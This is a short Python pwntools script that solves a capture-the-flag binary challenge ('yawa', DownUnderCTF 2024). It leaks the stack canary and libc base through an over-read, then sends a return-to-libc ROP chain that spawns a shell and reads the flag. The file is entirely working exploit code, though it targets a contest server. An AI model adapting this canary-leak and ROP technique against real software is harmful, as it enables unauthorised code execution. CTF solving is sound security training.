#!/usr/bin/env python3

from pwn import *
import struct

#context.log_level = "debug"
elf = ELF("./yawa_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("2024.ductf.dev", 30010)

p.sendlineafter(b"> ", b"1") # leak canary
p.send(b"A" * 89)
p.sendlineafter(b"> ", b"2")
p.recv(88 + 7 + 1)
canary = b"\x00" + p.recv(7)
log.success(f"canary: {canary.hex()}")

MAIN_RETURN_ADDRESS = 0x29d90 # where, in libc.so.6, main should return to

p.sendlineafter(b"> ", b"1") # leak return address
p.send(b"A" * 0x68)
p.sendlineafter(b"> ", b"2")
p.recv(0x68 + 7)
leak = struct.unpack("<Q", p.recv(6) + b"\x00\x00")[0]
libc.address = leak - MAIN_RETURN_ADDRESS
log.success(f"libc: {hex(libc.address)}")

p.sendlineafter(b"> ", b"1") # set return address to system("/bin/sh")
rop = ROP(libc)
rop.raw(b"A" * 88)
rop.raw(canary)
rop.raw(p64(0)) # saved rbp
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.send(rop.chain())

p.sendlineafter(b"> ", b"3") # return from main

p.sendline(b"cat flag.txt")

print(p.readline().decode()) # DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}
